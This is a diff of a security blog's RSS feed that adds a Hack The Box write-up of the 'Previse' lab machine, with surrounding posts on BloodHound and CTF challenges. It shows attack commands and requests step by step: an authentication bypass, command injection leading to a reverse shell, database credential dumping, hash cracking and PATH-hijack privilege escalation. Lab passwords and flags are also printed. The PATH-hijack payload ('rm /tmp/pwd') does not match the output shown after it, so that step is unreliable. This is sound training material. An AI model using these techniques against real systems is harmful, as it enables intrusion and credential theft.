@@ -1,4 +1,173 @@
-<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0" xmlns:media="http://search.yahoo.com/mrss/"><channel><title><![CDATA[null]]></title><description><![CDATA[null]]></description><link>inesmartins.github.io/</link><image><url>inesmartins.github.io/favicon.png</url><title>null</title><link>inesmartins.github.io/</link></image><generator>Ghost 4.7</generator><lastBuildDate>Fri, 21 Jan 2022 11:02:08 GMT</lastBuildDate><atom:link href="inesmartins.github.io/rss/" rel="self" type="application/rss+xml"/><ttl>60</ttl><item><title><![CDATA[HTB Write-up | BountyHunter]]></title><description><![CDATA[<blockquote>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/359">here</a>.</blockquote><h2 id="scanning">Scanning</h2><p>Like with most HTB machines, a quick scan only disclosed <code>SSH</code> running on port <code>22</code> and a web server running on port <code>80</code>:</p><pre><code>~ nmap 10.10.11.100
+<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0" xmlns:media="http://search.yahoo.com/mrss/"><channel><title><![CDATA[null]]></title><description><![CDATA[null]]></description><link>inesmartins.github.io/</link><image><url>inesmartins.github.io/favicon.png</url><title>null</title><link>inesmartins.github.io/</link></image><generator>Ghost 4.7</generator><lastBuildDate>Fri, 21 Jan 2022 11:04:25 GMT</lastBuildDate><atom:link href="inesmartins.github.io/rss/" rel="self" type="application/rss+xml"/><ttl>60</ttl><item><title><![CDATA[HTB Write-up | Previse]]></title><description><![CDATA[<blockquote>Retired machine can be found <a href="https://www.hackthebox.com/home/machines/profile/373">here</a>.</blockquote><h2 id="scanning">Scanning</h2><p>As always, we start by mapping the <code>previse.htb</code> hostname to the given IP: </p><pre><code>~ sudo nano /etc/hosts
+
+10.10.11.104  previse.htb</code></pre><p>... pretty boring, only a web server running on port <code>80</code> and an SSH server on port <code>22</code>:</p><pre><code>~ nmap 10.</code></pre>]]></description><link>inesmartins.github.io/htb-write-up-previse/</link><guid isPermaLink="false">61d17eafa85f99e081fdd052</guid><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Fri, 21 Jan 2022 11:04:08 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2022/01/Screenshot-2022-01-05-at-15.03.17.png" medium="image"/><content:encoded><![CDATA[<blockquote>Retired machine can be found <a href="https://www.hackthebox.com/home/machines/profile/373">here</a>.</blockquote><h2 id="scanning">Scanning</h2><img src="inesmartins.github.io/content/images/2022/01/Screenshot-2022-01-05-at-15.03.17.png" alt="HTB Write-up | Previse"><p>As always, we start by mapping the <code>previse.htb</code> hostname to the given IP: </p><pre><code>~ sudo nano /etc/hosts
+
+10.10.11.104  previse.htb</code></pre><p>... pretty boring, only a web server running on port <code>80</code> and an SSH server on port <code>22</code>:</p><pre><code>~ nmap 10.10.11.104
+
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+~  nmap 10.10.11.104 -sC -sV -A -p 22,80
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
+|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
+|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+| http-title: Previse Login
+|_Requested resource was login.php
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre><h2 id="enumeration">Enumeration</h2><p>When we access <a href="http://previse.htb">previse.htb</a> we&apos;re redirected to the login page:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2022/01/Screenshot-2022-01-02-at-10.32.16.png" class="kg-image" alt="HTB Write-up | Previse" loading="lazy"></figure><p>Let&apos;s try to enumerate some directories and files with <code>gobuster</code>:</p><pre><code>~ gobuster dir \
+-u http://previse.htb \
+-c PHPSESSID=r989gcoqshohp5v8thvcji2sh2 \
+-x php \
+-w ../seclists/big.txt \   
+-s 200 -b 403,404 --wildcard
+
+[...]
+
+/accounts.php         (Status: 302) [Size: 3994] [--&gt; login.php]
+/config.php           (Status: 200) [Size: 0]                   
+/css                  (Status: 301) [Size: 308] [--&gt; http://previse.htb/css/]
+/download.php         (Status: 302) [Size: 0] [--&gt; login.php]                
+/favicon.ico          (Status: 200) [Size: 15406]                            
+/files.php            (Status: 302) [Size: 8377] [--&gt; login.php]             
+/footer.php           (Status: 200) [Size: 217]                              
+/header.php           (Status: 200) [Size: 980]                              
+/index.php            (Status: 302) [Size: 2801] [--&gt; login.php]             
+/js                   (Status: 301) [Size: 307] [--&gt; http://previse.htb/js/] 
+/login.php            (Status: 200) [Size: 2224]                             
+/logout.php           (Status: 302) [Size: 0] [--&gt; login.php]                
+/logs.php             (Status: 302) [Size: 0] [--&gt; login.php]
+/nav.php              (Status: 200) [Size: 1248]
+/status.php           (Status: 302) [Size: 2970] [--&gt; login.php] </code></pre><p>All of the pages either redirect to <code>login.php</code> or have no interesting content, except for the <code>nav.php</code> which has some interesting links:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2022/01/Screenshot-2022-01-02-at-10.39.37.png" class="kg-image" alt="HTB Write-up | Previse" loading="lazy"></figure><p>The links are:</p><ul><li>Home: <code>/index.php</code></li><li>Accounts + Create Account: <code>/accounts.php</code></li><li>Files: <code>/files.php</code></li><li>Management Menu + Website Status: <code>/status.php</code></li><li>Log data: <code>/file_logs.php</code></li></ul><p>... but they all redirect to <code>login.php</code> since we&apos;re not authenticated.</p><h2 id="bypassing-authentication">Bypassing Authentication</h2><p>The <code>accounts.php</code> page seems the most interesting, maybe we can try some other HTTP methods:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2022/01/Screenshot-2022-01-02-at-11.24.01.png" class="kg-image" alt="HTB Write-up | Previse" loading="lazy"></figure><pre><code>POST /accounts.php HTTP/1.1
+Host: previse.htb
+Content-Length: 57
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:95.0) Gecko/20100101 Firefox/95.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: pt-PT,pt;q=0.8,en;q=0.5,en-US;q=0.3
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: PHPSESSID=prod44vfotfs0nvgir215458f0
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+
+username=inesmartins&amp;password=ines12345&amp;confirm=ines12345</code></pre><p>Using this <code>POST</code> request we can create a new user and log in:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2022/01/Screenshot-2022-01-02-at-11.24.38.png" class="kg-image" alt="HTB Write-up | Previse" loading="lazy" width="1440" height="427" srcset="inesmartins.github.io/content/images/size/w600/2022/01/Screenshot-2022-01-02-at-11.24.38.png 600w, inesmartins.github.io/content/images/size/w1000/2022/01/Screenshot-2022-01-02-at-11.24.38.png 1000w, inesmartins.github.io/content/images/2022/01/Screenshot-2022-01-02-at-11.24.38.png 1440w" sizes="(min-width: 1200px) 1200px"></figure><h2 id="exploring-the-website">Exploring the website</h2><p>On the <code>files.php</code> page there are clearly some attempts to upload reverse shells, as well as a <code>zip</code> file that contains the site backup:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2022/01/Screenshot-2022-01-02-at-11.25.33.png" class="kg-image" alt="HTB Write-up | Previse" loading="lazy" width="1440" height="686" srcset="inesmartins.github.io/content/images/size/w600/2022/01/Screenshot-2022-01-02-at-11.25.33.png 600w, inesmartins.github.io/content/images/size/w1000/2022/01/Screenshot-2022-01-02-at-11.25.33.png 1000w, inesmartins.github.io/content/images/2022/01/Screenshot-2022-01-02-at-11.25.33.png 1440w" sizes="(min-width: 1200px) 1200px"></figure><p>In the backup we can see the <code>config.php</code> file contains the DB credentials:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2022/01/Screenshot-2022-01-02-at-11.27.06.png" class="kg-image" alt="HTB Write-up | Previse" loading="lazy" width="650" height="366" srcset="inesmartins.github.io/content/images/size/w600/2022/01/Screenshot-2022-01-02-at-11.27.06.png 600w, inesmartins.github.io/content/images/2022/01/Screenshot-2022-01-02-at-11.27.06.png 650w"></figure><p>But the <code>logs.php</code> has the most potential, since there&apos;s a call to an <code>exec</code> function that uses a parameter sent via <code>POST</code> request:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2022/01/Screenshot-2022-01-02-at-11.29.44.png" class="kg-image" alt="HTB Write-up | Previse" loading="lazy" width="891" height="582" srcset="inesmartins.github.io/content/images/size/w600/2022/01/Screenshot-2022-01-02-at-11.29.44.png 600w, inesmartins.github.io/content/images/2022/01/Screenshot-2022-01-02-at-11.29.44.png 891w"></figure><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2022/01/Screenshot-2022-01-02-at-11.31.43.png" class="kg-image" alt="HTB Write-up | Previse" loading="lazy" width="1440" height="510" srcset="inesmartins.github.io/content/images/size/w600/2022/01/Screenshot-2022-01-02-at-11.31.43.png 600w, inesmartins.github.io/content/images/size/w1000/2022/01/Screenshot-2022-01-02-at-11.31.43.png 1000w, inesmartins.github.io/content/images/2022/01/Screenshot-2022-01-02-at-11.31.43.png 1440w" sizes="(min-width: 720px) 720px"></figure><p>We already know the format of this <code>POST</code> request since it&apos;s the one performed on the <code>file_logs.php</code> file:</p><pre><code>POST /logs.php HTTP/1.1
+Host: previse.htb
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:95.0) Gecko/20100101 Firefox/95.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: pt-PT,pt;q=0.8,en;q=0.5,en-US;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 49
+Origin: http://previse.htb
+Connection: close
+Referer: http://previse.htb/file_logs.php
+Cookie: PHPSESSID=prod44vfotfs0nvgir215458f0
+Upgrade-Insecure-Requests: 1
+
+delim=tab</code></pre><p>When we change this <code>delim</code> parameter to send a <code>curl</code> request to a simple local web server we get a ping back!</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2022/01/Screenshot-2022-01-04-at-13.29.05.png" class="kg-image" alt="HTB Write-up | Previse" loading="lazy" width="1440" height="583" srcset="inesmartins.github.io/content/images/size/w600/2022/01/Screenshot-2022-01-04-at-13.29.05.png 600w, inesmartins.github.io/content/images/size/w1000/2022/01/Screenshot-2022-01-04-at-13.29.05.png 1000w, inesmartins.github.io/content/images/2022/01/Screenshot-2022-01-04-at-13.29.05.png 1440w" sizes="(min-width: 1200px) 1200px"></figure><p>So, let&apos;s go for the reverse shell:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2022/01/Screenshot-2022-01-04-at-13.31.37.png" class="kg-image" alt="HTB Write-up | Previse" loading="lazy"></figure><p>We&apos;re in!</p><hr><h2 id="becoming-m4lwhere">Becoming m4lwhere</h2><p>First order of business: upgrade the shell!</p><pre><code class="language-python">~ python -c &apos;import pty; pty.spawn(&quot;/bin/bash&quot;)&apos;</code></pre><p>Let&apos;s see what else is there:</p><pre><code>bash-4.4$ cat /etc/passwd
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+m4lwhere:x:1000:1000:m4lwhere:/home/m4lwhere:/bin/bash
+mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false</code></pre><p>We have access to <code>m4lwhere</code>&apos;s home directory, but not to the user flag:</p><pre><code>bash-4.4$ cd /home/m4lwhere
+
+bash-4.4$ ls
+user.txt
+
+bash-4.4$ cat user.txt
+cat: user.txt: Permission denied</code></pre><p>Let&apos;s dump the database, since we already have the creds:</p><pre><code>~ mysqldump -u root -p --all-databases &gt; db_dump.sql
+
+Enter password: mySQL_p@ssw0rd!:)
+</code></pre><p>There&apos;s a hashed password for the <code>m4lwhere</code> user on the <code>accounts</code> table:</p><pre><code class="language-sql">CREATE TABLE `accounts` (
+  `id` int(11) NOT NULL AUTO_INCREMENT,
+  `username` varchar(50) NOT NULL,
+  `password` varchar(255) NOT NULL,
+  `created_at` datetime DEFAULT CURRENT_TIMESTAMP,
+  PRIMARY KEY (`id`),
+  UNIQUE KEY `username` (`username`)
+) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=latin1;
+
+INSERT INTO `accounts` VALUES 
+(1,&apos;m4lwhere&apos;,&apos;$1$&#xF0;&#x178;&#xA7;&#x201A;llol$DQpmdvnb7EeuO6UaqRItf.&apos;,&apos;2021-05-27 18:18:36&apos;),
+[...]</code></pre><p>Save me <code>hashcat</code>:</p><pre><code>~ nano hash
+
+$1$&#x1F9C2;llol$DQpmdvnb7EeuO6UaqRItf.
+
+~ hashcat -a 0 -m 500 hash ../seclists/pwds/rockyou.txt --show
+$1$&#x1F9C2;llol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235!</code></pre><p>We got the password!</p><pre><code>~ ssh m4lwhere@previse.htb
+
+m4lwhere@previse.htb&apos;s password: 
+&gt; ilovecody112235!
+
+[...]
+
+bash-4.4$ cat user.txt 
+cff266072b891cf5458d490516040d5b</code></pre><hr><h2 id="road-to-root">Road to root</h2><p>After some poking around I went back to the <code>/opt/script</code> directory:</p><pre><code>bash-4.4$ cd /opt/scripts/
+
+bash-4.4$ ls -la
+total 16
+drwxr-xr-x 2 root     root     4096 Jul 26 18:41 .
+drwxr-xr-x 3 root     root     4096 Jul 26 18:41 ..
+-rwxr-xr-x 1 root     root      486 Jun  6  2021 access_backup.sh
+-rw-r--r-- 1 m4lwhere m4lwhere  320 Jun  6  2021 log_process.py</code></pre><p>The <code>access_backup.sh</code> file looks very interesting:</p><pre><code>bash-4.4$ cat access_backup.sh
+#!/bin/bash
+
+# We always make sure to store logs, we take security SERIOUSLY here
+
+# I know I shouldnt run this as root but I cant figure it out programmatically on my account
+# This is configured to run with cron, added to sudo so I can run as needed - we&apos;ll fix it later when there&apos;s time
+
+gzip -c /var/log/apache2/access.log &gt; /var/backups/$(date --date=&quot;yesterday&quot; +%Y%b%d)_access.gz
+gzip -c /var/www/file_access.log &gt; /var/backups/$(date --date=&quot;yesterday&quot; +%Y%b%d)_file_access.gz</code></pre><p>OK, what if we poison the <code>gzip</code> binary:</p><pre><code>bash-4.4$ which gzip
+/bin/gzip
+
+bash-4.4$ echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+
+bash-4.4$ echo &quot;rm /tmp/pwd&quot; &gt; /tmp/gzip
+bash-4.4$ chmod 777 /tmp/gzip 
+bash-4.4$ export PATH=/tmp:$PATH
+bash-4.4$ cd /opt/scripts/
+bash-4.4$ sudo ./access_backup.sh 
+&gt; ilovecody112235!
+bash-4.4$ cat /tmp/pwd 
+b3ca53edb5aecbbc2cd1456f3454cb47</code></pre><p>We&apos;re done babyyyyy!</p><hr>]]></content:encoded></item><item><title><![CDATA[HTB Write-up | BountyHunter]]></title><description><![CDATA[<blockquote>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/359">here</a>.</blockquote><h2 id="scanning">Scanning</h2><p>Like with most HTB machines, a quick scan only disclosed <code>SSH</code> running on port <code>22</code> and a web server running on port <code>80</code>:</p><pre><code>~ nmap 10.10.11.100
 
 PORT   STATE SERVICE
 22/tcp open  ssh
@@ -596,31 +765,4 @@ INFO: Querying computer: XXX2.abc.local
 INFO: Ignoring host XXX1.abc.local since its hostname does not match: Supplied hostname XXX1.abc.local does not match reported hostnames dc1 or dc1.abc.local
 INFO: Done in 00M 08S</code></pre><p>This process should output some <code>.json</code> files to your local directory. You&apos;ll be able to import and visualise the data on the next step.</p><hr><h2 id="visualising-the-data">Visualising the data</h2><p>Start by downloading the macOS versions of both <a href="https://neo4j.com/download-center/#community">neo4j Community Edition Server</a> and <a href="https://github.com/BloodHoundAD/BloodHound/releases">Bloodhound GUI</a>.</p><p>Then, go to the directory where you downloaded <code>neo4j</code> and run:</p><pre><code>~ tar -xf neo4j-community-x.x.x-unix.tar
 ~ cd neo4j-community-x.x.x/bin
-~ ./neo4j console</code></pre><p>Once the <code>neo4j</code> console application is running, go to <a href="http://localhost:7474">http://localhost:7474</a> and authenticate with credentials: <code>neo4j/neo4j</code>. </p><p>You&apos;ll be prompted to change the password, so make sure to save these new creds, you&apos;ll need for the next step.</p><p>Now, go to the directory where you downloaded <code>Bloodhound GUI</code> and launch the app. </p><p>Leave the default DB URL and enter the same credentials you just set up for <code>neo4j</code>.</p><p>After logging in, on the right side, you&apos;ll see an icon to upload data. Click on the icon and import the <code>.json</code> files outputted on the previous step.</p><p>You should now have everything you need to visualise your AD info using Bloodhound! </p>]]></content:encoded></item><item><title><![CDATA[Update: Simplest way to host your Ghost blog on GitHub Pages]]></title><description><![CDATA[<p>Last year I <a href="https://inesmartins.github.io/simplest-way-to-host-your-ghost-site-on-gitpages/">created a post</a> about how to get a Ghost blog up and running on Github Pages without much effort.</p><p>This worked well, but after being forced to update <a href="https://www.npmjs.com/package/ghost-cli">ghost-cli</a> to version <code>1.17.3</code> I ran into a few issues and had to rethink the entire process.</p>]]></description><link>inesmartins.github.io/simplest-way-to-host-your-ghost-blog-on-github-pages/</link><guid isPermaLink="false">60c5dd95eb71c50b03caced6</guid><category><![CDATA[ghost]]></category><category><![CDATA[github pages]]></category><category><![CDATA[blog]]></category><category><![CDATA[static site generator]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sun, 13 Jun 2021 10:38:48 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2021/07/Screenshot-2021-07-11-at-15.02.38.png" medium="image"/><content:encoded><![CDATA[<img src="inesmartins.github.io/content/images/2021/07/Screenshot-2021-07-11-at-15.02.38.png" alt="Update: Simplest way to host your Ghost blog on GitHub Pages"><p>Last year I <a href="https://inesmartins.github.io/simplest-way-to-host-your-ghost-site-on-gitpages/">created a post</a> about how to get a Ghost blog up and running on Github Pages without much effort.</p><p>This worked well, but after being forced to update <a href="https://www.npmjs.com/package/ghost-cli">ghost-cli</a> to version <code>1.17.3</code> I ran into a few issues and had to rethink the entire process.</p><p>Luckily, I found an even simpler way to do it.</p><p>Assuming you have a local instance of Ghost running on the default port <code>2368</code>:</p><ul><li>Make sure you have <a href="https://www.gnu.org/software/wget/">wget</a> installed</li><li>Add this script to your directory but make sure to replace <code>yourdomain.com</code> with your actual Github Pages domain, e.g.: <code>inesmartins.github.io</code>:</li></ul><!--kg-card-begin: html--><script src="https://gist.github.com/inesmartins/6f90f6a2812c7727d25ae3f9a3771b35.js"></script><!--kg-card-end: html--><p>(based on script from <a href="https://fizzy.cc/ghost-static-generator/">fizzy.cc</a>)</p><p>This script generate a <code>static</code> directory with the entire content of your Ghost instance as a static website. Just copy this content to the Github Pages repository, and your website will be instantly updated.</p><p>In order to make this process even easier, I created an NPM script, which makes this as easy as running: <code>npm run publish</code> on your original repository:</p><!--kg-card-begin: html--><script src="https://gist.github.com/inesmartins/7fbd5dc9ed1cc418d27386559581cd43.js"></script><!--kg-card-end: html-->]]></content:encoded></item><item><title><![CDATA[ØxOPOSɆC - HTTP2]]></title><description><![CDATA[<blockquote>URL: <a href="https://20.56.49.147/">https://20.56.49.147/</a> | Keep calm and get the flag :)</blockquote><p>When you enter the IP directly on the browser you see only an image sourced <a href="https://github.com/verhas/pushbuilder">from Github</a> and a hidden clue: &quot;Lost? It&apos;s evolution, baby...&quot;:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/05/image-84.png" class="kg-image" alt loading="lazy" width="860" height="352" srcset="inesmartins.github.io/content/images/size/w600/2021/05/image-84.png 600w, inesmartins.github.io/content/images/2021/05/image-84.png 860w" sizes="(min-width: 720px) 720px"></figure><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/05/image-85.png" class="kg-image" alt loading="lazy" width="788" height="123" srcset="inesmartins.github.io/content/images/size/w600/2021/05/image-85.png 600w, inesmartins.github.io/content/images/2021/05/image-85.png 788w"></figure><p>The image shows the evolution of the <code>HTTP</code> protocol,</p>]]></description><link>inesmartins.github.io/oposec-http2/</link><guid isPermaLink="false">60aa1e4ce1e20f0a69e2a808</guid><category><![CDATA[oposec]]></category><category><![CDATA[http2]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Fri, 28 May 2021 11:30:46 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2021/06/highres_471963990-1-1.jpeg" medium="image"/><content:encoded><![CDATA[<blockquote>URL: <a href="https://20.56.49.147/">https://20.56.49.147/</a> | Keep calm and get the flag :)</blockquote><img src="inesmartins.github.io/content/images/2021/06/highres_471963990-1-1.jpeg" alt="&#xD8;xOPOS&#x246;C - HTTP2"><p>When you enter the IP directly on the browser you see only an image sourced <a href="https://github.com/verhas/pushbuilder">from Github</a> and a hidden clue: &quot;Lost? It&apos;s evolution, baby...&quot;:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/05/image-84.png" class="kg-image" alt="&#xD8;xOPOS&#x246;C - HTTP2" loading="lazy" width="860" height="352" srcset="inesmartins.github.io/content/images/size/w600/2021/05/image-84.png 600w, inesmartins.github.io/content/images/2021/05/image-84.png 860w" sizes="(min-width: 720px) 720px"></figure><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/05/image-85.png" class="kg-image" alt="&#xD8;xOPOS&#x246;C - HTTP2" loading="lazy" width="788" height="123" srcset="inesmartins.github.io/content/images/size/w600/2021/05/image-85.png 600w, inesmartins.github.io/content/images/2021/05/image-85.png 788w"></figure><p>The image shows the evolution of the <code>HTTP</code> protocol, so it makes sense that this challenge is about some HTTP feature, either new or deprecated.</p><p>Using <code>curl</code> to fetch the page we see that it&apos;s served via <code>HTTP/2</code>, which is still kind of rare in the wild:</p><pre><code>~ curl -ik https://20.56.49.147/
-HTTP/2 200
-server: nginx/1.19.10
-date: Fri, 28 May 2021 11:27:17 GMT
-content-type: text/html
-content-length: 129
-last-modified: Thu, 20 May 2021 10:10:20 GMT
-etag: &quot;60a6358c-81&quot;
-accept-ranges: bytes
-
-&lt;img src=&quot;https://raw.githubusercontent.com/verhas/pushbuilder/master/http-versions.png&quot;&gt;
-&lt;!-- Lost? It&apos;s evolution, baby... --&gt;</code></pre><p><code>HTTP/2</code> supports the <a href="https://www.smashingmagazine.com/2017/04/guide-http2-server-push/">Server Push</a> feature, which basically enables servers to send assets to the client without the client having to request them, which is the perfect setup for a hidden file, like the flag.</p><p>In order to log these &quot;hidden&quot; request, we can use <a href="chrome://net-export/">Chrome Net Export tool</a>:</p><ul><li>Open up a new Chrome tab and enter <code>chrome://net-export/</code>:</li></ul><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/05/image-86.png" class="kg-image" alt="&#xD8;xOPOS&#x246;C - HTTP2" loading="lazy" width="1167" height="415" srcset="inesmartins.github.io/content/images/size/w600/2021/05/image-86.png 600w, inesmartins.github.io/content/images/size/w1000/2021/05/image-86.png 1000w, inesmartins.github.io/content/images/2021/05/image-86.png 1167w"></figure><ul><li>Click &quot;Start Logging to Disk&quot; and choose the file where you want to write on your computer;</li><li>Go to the challenge website and reload it;</li><li>Go back to the Chrome Net Export tool and click &quot;Stop Logging&quot;;</li><li>Click &quot;Show file&quot; to see the log file;</li><li>Search for the word <code>flag</code> among the results:</li></ul><pre><code>...
-{
-   &quot;params&quot;:{
-      &quot;headers&quot;:[
-         &quot;:method: GET&quot;,
-         &quot;:path: /flag_652f92e28feb20d2dc22874d54cefb9b0cf96ce5c65552161fdaad4a33776394.txt&quot;,
-         &quot;:scheme: https&quot;,
-         &quot;:authority: 20.56.49.147&quot;,
-         &quot;accept-encoding: gzip, deflate, br&quot;,
-         &quot;accept-language: en-US,en;q=0.9,pt-PT;q=0.8,pt;q=0.7&quot;,
-         &quot;user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36&quot;
-      ],
-      &quot;id&quot;:1,&quot;promised_stream_id&quot;:2
-   },
-   ...
-},
-...</code></pre><ul><li>Access the resource and get the flag:</li></ul><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/05/image-87.png" class="kg-image" alt="&#xD8;xOPOS&#x246;C - HTTP2" loading="lazy" width="951" height="92" srcset="inesmartins.github.io/content/images/size/w600/2021/05/image-87.png 600w, inesmartins.github.io/content/images/2021/05/image-87.png 951w"></figure><p>Note that alternatively, we could have simply used <a href="https://nghttp2.org/">Nghttp2</a>.</p>]]></content:encoded></item></channel></rss>
+~ ./neo4j console</code></pre><p>Once the <code>neo4j</code> console application is running, go to <a href="http://localhost:7474">http://localhost:7474</a> and authenticate with credentials: <code>neo4j/neo4j</code>. </p><p>You&apos;ll be prompted to change the password, so make sure to save these new creds, you&apos;ll need for the next step.</p><p>Now, go to the directory where you downloaded <code>Bloodhound GUI</code> and launch the app. </p><p>Leave the default DB URL and enter the same credentials you just set up for <code>neo4j</code>.</p><p>After logging in, on the right side, you&apos;ll see an icon to upload data. Click on the icon and import the <code>.json</code> files outputted on the previous step.</p><p>You should now have everything you need to visualise your AD info using Bloodhound! </p>]]></content:encoded></item><item><title><![CDATA[Update: Simplest way to host your Ghost blog on GitHub Pages]]></title><description><![CDATA[<p>Last year I <a href="https://inesmartins.github.io/simplest-way-to-host-your-ghost-site-on-gitpages/">created a post</a> about how to get a Ghost blog up and running on Github Pages without much effort.</p><p>This worked well, but after being forced to update <a href="https://www.npmjs.com/package/ghost-cli">ghost-cli</a> to version <code>1.17.3</code> I ran into a few issues and had to rethink the entire process.</p>]]></description><link>inesmartins.github.io/simplest-way-to-host-your-ghost-blog-on-github-pages/</link><guid isPermaLink="false">60c5dd95eb71c50b03caced6</guid><category><![CDATA[ghost]]></category><category><![CDATA[github pages]]></category><category><![CDATA[blog]]></category><category><![CDATA[static site generator]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sun, 13 Jun 2021 10:38:48 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2021/07/Screenshot-2021-07-11-at-15.02.38.png" medium="image"/><content:encoded><![CDATA[<img src="inesmartins.github.io/content/images/2021/07/Screenshot-2021-07-11-at-15.02.38.png" alt="Update: Simplest way to host your Ghost blog on GitHub Pages"><p>Last year I <a href="https://inesmartins.github.io/simplest-way-to-host-your-ghost-site-on-gitpages/">created a post</a> about how to get a Ghost blog up and running on Github Pages without much effort.</p><p>This worked well, but after being forced to update <a href="https://www.npmjs.com/package/ghost-cli">ghost-cli</a> to version <code>1.17.3</code> I ran into a few issues and had to rethink the entire process.</p><p>Luckily, I found an even simpler way to do it.</p><p>Assuming you have a local instance of Ghost running on the default port <code>2368</code>:</p><ul><li>Make sure you have <a href="https://www.gnu.org/software/wget/">wget</a> installed</li><li>Add this script to your directory but make sure to replace <code>yourdomain.com</code> with your actual Github Pages domain, e.g.: 